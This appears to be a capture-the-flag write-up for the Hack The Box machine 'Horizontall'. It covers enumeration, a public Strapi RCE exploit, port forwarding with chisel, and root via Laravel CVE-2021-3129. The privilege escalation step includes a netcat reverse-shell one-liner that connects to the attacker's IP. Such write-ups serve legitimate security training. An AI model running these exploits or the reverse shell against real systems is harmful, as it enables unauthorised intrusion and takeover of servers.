# Horizontall

## Foothold

First as always, `nmap`

```
# Nmap 7.92 scan initiated Sun Sep  5 14:00:18 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.11.105
Nmap scan report for 10.10.11.105
Host is up, received syn-ack (0.041s latency).
Scanned at 2021-09-05 14:00:19 +07 for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  5 14:00:26 2021 -- 1 IP address (1 host up) scanned in 8.45 seconds
```

We have a web server. Navigating to the web server with the IP address redirects us to `http://horizontall.htb`.

```sh
$ curl http://10.10.11.105 -I
HTTP/1.1 301 Moved Permanently
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 05 Sep 2021 07:00:03 GMT
Content-Type: text/html
Content-Length: 194
Connection: keep-alive
Location: http://horizontall.htb
```

We then add the domain name to our `/etc/passwd` and fuzz for subdomains.

```sh
$ ffuf -u "http://horizontall.htb/" -H "Host: FUZZ.horizontall.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 194

www                     [Status: 200, Size: 901, Words: 43, Lines: 2, Duration: 49ms]
api-prod                [Status: 200, Size: 413, Words: 76, Lines: 20, Duration: 57ms]
```

The pages at `http://horizontall.htb/` and `http://www.horizontall.htb/` look to be the same static page with nothing special. Running `gobuster` on them reveals no special directory or file. With nothing on the 2 pages, I went on to enumerate `api-prod`.

```sh
$ ffuf -u "http://api-prod.horizontall.htb/?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 413
$ ffuf -u "http://api-prod.horizontall.htb/?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 413 -X POST
$ ffuf -u "http://api-prod.horizontall.htb/?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt  -fs 413
$ ffuf -u "http://api-prod.horizontall.htb/?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt  -fs 413 -X POST
```

This, however, returns nothing. Running `gobuster` returns a few things ...

```sh
/ADMIN                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/REVIEWS              (Status: 200) [Size: 507]
/Reviews              (Status: 200) [Size: 507]
/Users                (Status: 403) [Size: 60]
/admin                (Status: 200) [Size: 854]
/reviews              (Status: 200) [Size: 507]
/users                (Status: 403) [Size: 60]
```

... all of which I run `ffuf` on like before, though that also returns nothing.

Looking at the traffic ...

```sh
$ curl -I http://api-prod.horizontall.htb/
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 05 Sep 2021 07:45:24 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 413
Connection: keep-alive
Vary: Origin
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Last-Modified: Wed, 02 Jun 2021 20:00:29 GMT
Cache-Control: max-age=60
X-Powered-By: Strapi <strapi.io>
```

We see an interesting header: `X-Powered-By: Strapi <strapi.io>`. We then look up exploits for strapi. Among the exploits I found, [this](https://www.exploit-db.com/exploits/50239) doesn't require credentials and works pretty much out of the box to give us RCE. Optionally, after running the exploit, we can confirm that we have RCE by listening for pings with `sudo tcpdump -i tun0 icmp` and `ping`ing our machine with `ping -c 4 YOUR_IP`. We can the get a reverse shell on the box.

## Privilege Escalation

Looking at listening ports ...

```sh
strapi@horizontall:~/myapi$ ss -tulnp
Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port
tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*
tcp    LISTEN   0        128             127.0.0.1:1337          0.0.0.0:*       users:(("node",pid=1766,fd=31))
tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*
tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*
tcp    LISTEN   0        128               0.0.0.0:80            0.0.0.0:*
tcp    LISTEN   0        128                  [::]:22               [::]:*
tcp    LISTEN   0        128                  [::]:80               [::]:*
```

 ... we see some things are listening on ports  1337 and 8000. I wanted to take a look so I uploaded `chisel` and port-forward to those ports. The service on port 1337 is just `api-prod.horizontall.htb`. Port 8000, however, is a Laravel page.

```sh
# atk machine
$ chisel server -p 9001 --reverse

# target
$ ./chisel client 10.10.14.79:9001 R:8000:127.0.0.1:8000
```

Looking at the landing page, we see that we have Laravel v8 running with debug mode on. Looking around, we find that it's vulnerable to CVE-2021-3129, for which I found [this](https://github.com/nth347/CVE-2021-3129_exploit) to work. I `git clone` the exploit, set up a listener and run it with a reverse shell.

```sh
$ ./exploit.py http://localhost:8000 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.79 1337 >/tmp/f"
```

With that, we should have a shell as root.
